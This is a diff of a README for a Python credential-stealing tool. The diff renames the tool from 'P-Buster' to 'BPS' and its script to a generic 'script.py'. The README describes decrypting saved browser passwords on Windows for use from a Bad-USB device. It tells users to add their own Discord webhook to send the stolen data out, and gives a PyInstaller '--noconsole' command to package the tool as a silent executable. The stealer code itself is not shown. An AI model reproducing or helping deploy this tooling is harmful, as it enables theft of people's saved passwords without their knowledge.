@@ -1,10 +1,10 @@
 
-# 🔒🔑 P-Buster - Browser Password Stealer
+# 🔒🔑 BPS - Browser Password Stealer
 
-P-Buster is a Python tool designed to **Decrypt** and **Extract** local saved passwords on Windows.
+BPS is a Python tool designed to **Decrypt** and **Extract** local saved passwords on Windows.
 
 Originally, I got a Raspberry Pi Pico to use it as a Bad-USB. I wrote a few light scripts for fun and this his one of them.
-P-Buster for Password-Buster is a python script use to steal browser saved password.
+BPS is a python script use to steal browser saved password.
 
 ## Script Development
 **How does this work ?**
@@ -45,7 +45,7 @@ Once the passwords are decrypted, depending on the intended use, it can be helpf
    ```
    pip install pycryptodome pypiwin32 requests
    ```
-3. ```python p-buster.py```
+3. ```python script.py```
 
 ## Usability
 For extract data put your own discord webhook.
@@ -57,7 +57,7 @@ You can use PiInstaller to make an application file (.exe) from your python scri
   ```bash
 pip install pyinstaller
 cd your-directory
-python -m PyInstaller --onefile --noconsole p-buster.py
+python -m PyInstaller --onefile --noconsole script.py
   ```
 
 
